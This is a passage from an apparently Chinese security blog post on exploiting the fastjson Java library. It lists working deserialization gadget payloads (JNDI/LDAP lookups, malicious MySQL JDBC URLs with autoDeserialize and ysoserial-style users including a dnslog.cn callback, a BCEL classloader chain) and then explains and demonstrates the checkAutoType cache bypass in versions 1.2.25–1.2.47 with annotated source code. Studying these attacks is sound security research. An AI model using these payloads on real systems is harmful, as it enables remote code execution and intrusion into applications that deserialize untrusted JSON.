class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>OracleManagedConnectionFactory</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;xaDataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>JNDIConfiguration</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;prefix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>JDBC4Connection</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hostToConnectTo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;172.20.64.40&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;portToConnectTo&quot;</span><span class="punctuation">:</span> <span class="number">3306</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jdbc:mysql://172.20.64.40:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;databaseToConnectTo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.util.Properties&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;PORT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3306&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;statementInterceptors&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoDeserialize&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yso_URLDNS_http://ahfladhjfd.6fehoy.dnslog.cn&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;PORT.1&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3306&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;HOST.1&quot;</span><span class="punctuation">:</span> <span class="string">&quot;172.20.64.40&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;NUM_HOSTS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;HOST&quot;</span><span class="punctuation">:</span> <span class="string">&quot;172.20.64.40&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;DBNAME&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>LoadBalancedMySQLConnection</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;proxy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;connectionString&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>UnpooledDataSource</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;c&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;driver&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$...&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">:</span> <span class="string">&quot;a&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>LoadBalancedMySQLConnection2</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;, &quot;proxy&quot;: &#123; &quot;connectionString&quot;:&#123; &quot;url&quot;:&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;useSSL=false&amp;user=yso_CommonsCollections5_calc&quot; &#125; &#125; &#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>ReplicationMySQLConnection</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">       &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">       &quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;,</span><br><span class="line">       &quot;proxy&quot;: &#123;</span><br><span class="line">              &quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;,</span><br><span class="line">              &quot;connectionUrl&quot;:&#123;</span><br><span class="line">                     &quot;@type&quot;:&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;,</span><br><span class="line">                     &quot;masters&quot;:[&#123;</span><br><span class="line">                            &quot;host&quot;:&quot;&quot;</span><br><span class="line">                     &#125;],</span><br><span class="line">                     &quot;slaves&quot;:[],</span><br><span class="line">                     &quot;properties&quot;:&#123;</span><br><span class="line">                            &quot;host&quot;:&quot;127.0.0.1&quot;,</span><br><span class="line">                            &quot;port&quot;:&quot;3306&quot;,          </span><br><span class="line">                            &quot;user&quot;:&quot;yso_CommonsCollections4_calc&quot;,</span><br><span class="line">                            &quot;dbname&quot;:&quot;dbname&quot;,</span><br><span class="line">                            &quot;password&quot;:&quot;pass&quot;,</span><br><span class="line">                            &quot;queryInterceptors&quot;:&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,</span><br><span class="line">                            &quot;autoDeserialize&quot;:&quot;true&quot;</span><br><span class="line">                     &#125;</span><br><span class="line">              &#125;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="基于检测逻辑"><a href="#基于检测逻辑" class="headerlink" title="基于检测逻辑"></a>基于检测逻辑</h2><h3 id="缓存绕过（1-2-25-1-2-47）"><a href="#缓存绕过（1-2-25-1-2-47）" class="headerlink" title="缓存绕过（1.2.25-1.2.47）"></a>缓存绕过（1.2.25-1.2.47）</h3><p><strong>fastjson ≤ 1.2.47</strong> 的 <code>checkAutoType()</code> 有个<strong>顺序错误</strong>：</p>
<p>它<strong>先</strong>去缓存里找类（<code>TypeUtils.mappings</code> &#x2F; <code>deserializers</code>），<strong>找到就直接返回</strong>，<strong>后面黑名单&#x2F;白名单的检查就完全不走了</strong>。</p>
<p>而我们又可以用一次特殊的 JSON（把 <code>@type</code> 设成 <code>java.lang.Class</code>）来<strong>把任意类名先塞进这个缓存</strong>。</p>
<p>于是第二次再用这个<strong>本应在黑名单里</strong>的类名发起反序列化时，就<strong>被当成“缓存命中”直接放行</strong>，实现绕过并利用（例如 JNDI 触发 RCE）。</p>
<hr>
<p>假设我们构造下面这段 payload，然后传给 <code>com.alibaba.fastjson.JSON#parse</code> 反序列化：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;aaa&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p><code>com.alibaba.fastjson.JSON#parse</code> 函数反序列化会调用到 <code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</code> 函数，该函数会针对不同的键执行不同的反序列化逻辑。</p>
<p>其中对于 <code>@type</code> 键，<code>parseObject</code> 函数在处理处理时会考虑 <code>&#123;@type: ..., val: ...&#125;</code> 这种特殊的情况：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理 JSON 对象里的特殊键 &quot;<span class="doctag">@type</span>&quot;（即 JSON.DEFAULT_TYPE_KEY）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 作用与流程（重点）：</span></span><br><span class="line"><span class="comment"> * 1) 若未禁用“特殊键检测”，当读到 &quot;<span class="doctag">@type</span>&quot;：</span></span><br><span class="line"><span class="comment"> *    - 取出类型名字符串 typeName；</span></span><br><span class="line"><span class="comment"> *    - 若开启了 IgnoreAutoType：忽略这次类型声明（当作普通字段），继续解析其他键值；</span></span><br><span class="line"><span class="comment"> *    - 否则调用 ParserConfig.checkAutoType(...) 做安全校验与类型解析，得到 clazz；</span></span><br><span class="line"><span class="comment"> * 2) 如果 clazz 为 null：说明该类型不被允许（或未识别）。把 &quot;<span class="doctag">@type</span>&quot;:typeName 当成普通字段存进 map，继续解析。</span></span><br><span class="line"><span class="comment"> * 3) 提前读下一个 token：</span></span><br><span class="line"><span class="comment"> *    - 如果对象就此结束（立刻遇到 &#x27;&#125;&#x27;），尝试直接“创建一个实例”作为结果返回：</span></span><br><span class="line"><span class="comment"> *      a. 若该类型的反序列化器是 JavaBeanDeserializer，优先走其 createInstance(...)；</span></span><br><span class="line"><span class="comment"> *         然后把之前已读到但还在 map 里的字段，逐个写回到该实例对应字段。</span></span><br><span class="line"><span class="comment"> *      b. 否则按若干兜底规则：Cloneable → new HashMap；Collections$EmptyMap → Collections.emptyMap()；</span></span><br><span class="line"><span class="comment"> *         其余尝试 clazz.newInstance()。</span></span><br><span class="line"><span class="comment"> *    - 如果对象未结束（还有内容），则：</span></span><br><span class="line"><span class="comment"> *      a. 设置 resolveStatus = TypeNameRedirect   ←【关键】：告诉后续反序列化器“从 &#x27;val&#x27; 读取真正的值”</span></span><br><span class="line"><span class="comment"> *      b. 根据上下文条件 popContext() 一次，清理解析上下文；</span></span><br><span class="line"><span class="comment"> *      c. 如果在遇到 &quot;<span class="doctag">@type</span>&quot; 之前已经解析进了一些键值（object.size()&gt;0）：</span></span><br><span class="line"><span class="comment"> *         先把这些键值用 TypeUtils.cast(...) 转成目标类型的一个实例，然后继续 parseObject(newObj) 补齐剩余字段；</span></span><br><span class="line"><span class="comment"> *         最后返回该实例。</span></span><br><span class="line"><span class="comment"> *      d. 否则（没有已解析字段）：定位该类型的反序列化器，做一个小判断后（某些自定义 JavaBean 反序列化器清掉重定向标记），</span></span><br><span class="line"><span class="comment"> *         调用 deserializer.deserialze(this, clazz, fieldName) 让它完成后续解析。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 安全要点（与历史漏洞相关）：</span></span><br><span class="line"><span class="comment"> * - 这里会调用 config.checkAutoType(typeName, ...)。如果攻击者能让危险类型提前进入缓存（TypeUtils.mappings），</span></span><br><span class="line"><span class="comment"> *   某些版本的 checkAutoType 会因为“先命中缓存即返回”而绕过后续黑/白名单。</span></span><br><span class="line"><span class="comment"> * - 设置 resolveStatus=TypeNameRedirect 后，像处理 Class.class 的 MiscCodec 就会去读 &quot;val&quot;，并在</span></span><br><span class="line"><span class="comment"> *   TypeUtils.loadClass(String, ClassLoader) 的“双参重载”中把类名写入 TypeUtils.mappings（等效 cache=true），</span></span><br><span class="line"><span class="comment"> *   为后续的“缓存短路”铺路。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY                          <span class="comment">// 命中特殊键 &quot;@type&quot;（注意：此处用 ==，依赖 symbolTable 的字符串驻留）</span></span><br><span class="line">        &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123; <span class="comment">// 未禁用特殊键检测</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取类型名：从当前 lexer 中扫描一个带引号的字符串作为符号（进入 symbolTable 驻留/复用）</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果启用了“忽略 AutoType”开关，则直接跳过这次类型声明，把它当作普通键处理</span></span><br><span class="line">    <span class="keyword">if</span> (lexer.isEnabled(Feature.IgnoreAutoType)) &#123;</span><br><span class="line">        <span class="keyword">continue</span>; <span class="comment">// 回到外层循环，继续处理下一个键</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析/确认要用的 Java 类型</span></span><br><span class="line">    Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (object != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; object.getClass().getName().equals(typeName)) &#123;</span><br><span class="line">        <span class="comment">// 如果当前对象已经有实例，且其类名恰好等于 typeName，则直接复用该类</span></span><br><span class="line">        clazz = object.getClass();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 否则走安全检查与解析：可能触发白/黑名单逻辑，或命中缓存等</span></span><br><span class="line">        clazz = config.checkAutoType(typeName, <span class="literal">null</span>, lexer.getFeatures());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若未能解析/允许该类型：把 &quot;@type&quot;:typeName 当普通字段存进 map，继续解析后面的内容</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        map.put(JSON.DEFAULT_TYPE_KEY, typeName);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取下一个 token，目标希望是逗号（fastjson 的 nextToken(期望) 写法）</span></span><br><span class="line">    lexer.nextToken(JSONToken.COMMA);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果紧接着就是对象结束 &#x27;&#125;&#x27;，说明这是一个仅包含 &quot;@type&quot; 的对象（或 &quot;@type&quot; 已经是最后一个键）</span></span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.RBRACE) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 能走到这，说明对象没有立刻结束（@type 后面还有内容）。</span></span><br><span class="line">    <span class="comment">// 【关键】设置“类型名重定向”标记：提示后续反序列化器按“&#123;@type:..., val: ...&#125;”的包装格式，</span></span><br><span class="line">    <span class="comment">//         去读取紧随其后的 &quot;val&quot; 作为真正的数据载荷。</span></span><br><span class="line">    <span class="built_in">this</span>.setResolveStatus(TypeNameRedirect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 走到这里，说明没什么已解析字段，直接交给该类型的反序列化器去处理后续</span></span><br><span class="line">    <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 【关键】交由目标类型的反序列化器完成真正的解析（典型：Class.class → MiscCodec，</span></span><br><span class="line">    <span class="comment">// MiscCodec 会看到 TypeNameRedirect，从而去读取 &quot;val&quot;）</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>&#123;@type: ..., val: ...&#125;</code> 是 fastjson 为了<strong>在 JSON 里携带“真实 Java 类型信息”</strong>而约定的一种<strong>“类型包装格式”</strong>。</p>
<ul>
<li><code>@type</code>：写<strong>类全名</strong>（如 <code>java.net.URL</code>、<code>java.lang.Class</code>、你的业务类等）；</li>
<li><code>val</code>：写<strong>真正的值</strong>（比如一个字符串 URL、类名字符串、或别的标量）。</li>
</ul>
<p>它的原始用途是：在<strong>多态&#x2F;泛型&#x2F;Object</strong> 等场景里，让反序列化时<strong>知道要还原成哪个具体类</strong>。</p>
<p>像 <code>Class</code>、<code>URL</code>、<code>URI</code>、<code>Pattern</code>、<code>Locale</code>、<code>UUID</code>、<code>TimeZone</code>、<code>SimpleDateFormat</code> 等，本体最自然的 JSON 形态就是<strong>一个字符串</strong>或简单标量。如果只写 <code>&quot;http://a.b&quot;</code>，反序列化端不知道这是该当作 <code>String</code> 还是 <code>URL</code>。于是 fastjson 用类型包装：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.URL&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://a.b&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>反序列化端读取 <code>@type</code> → 知道要按 <code>URL</code> 还原；再从 <code>val</code> 拿到真实字符串去 <code>new URL(...)</code>。</p>
<p>因此在 <code>parseObject</code> 函数中，这种类型的数据会被交由 <code>derializer</code> 中存储的 <code>clazz</code> 对应的反序列化器解析。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 走到这里，说明没什么已解析字段，直接交给该类型的反序列化器去处理后续</span></span><br><span class="line"><span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);</span><br><span class="line"></span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 【关键】交由目标类型的反序列化器完成真正的解析（典型：Class.class → MiscCodec，</span></span><br><span class="line"><span class="comment">// MiscCodec 会看到 TypeNameRedirect，从而去读取 &quot;val&quot;）</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> obj;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>clazz</code> 来源于 <code>@type</code> 对应的值：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读取类型名：从当前 lexer 中扫描一个带引号的字符串作为符号（进入 symbolTable 驻留/复用）</span></span><br><span class="line"><span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析/确认要用的 Java 类型</span></span><br><span class="line">Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (object != <span class="literal">null</span></span><br><span class="line">        &amp;&amp; object.getClass().getName().equals(typeName)) &#123;</span><br><span class="line">    <span class="comment">// 如果当前对象已经有实例，且其类名恰好等于 typeName，则直接复用该类</span></span><br><span class="line">    clazz = object.getClass();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 否则走安全检查与解析：可能触发白/黑名单逻辑，或命中缓存等</span></span><br><span class="line">    clazz = config.checkAutoType(typeName, <span class="literal">null</span>, lexer.getFeatures());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>获取 <code>deserializer</code> 的 <code> com.alibaba.fastjson.parser.ParserConfig#getDeserializer</code> 函数本质上是从 <code>com.alibaba.fastjson.parser.ParserConfig#deserializers</code> 中取 <code>type</code> 对应的反序列化器。</p>
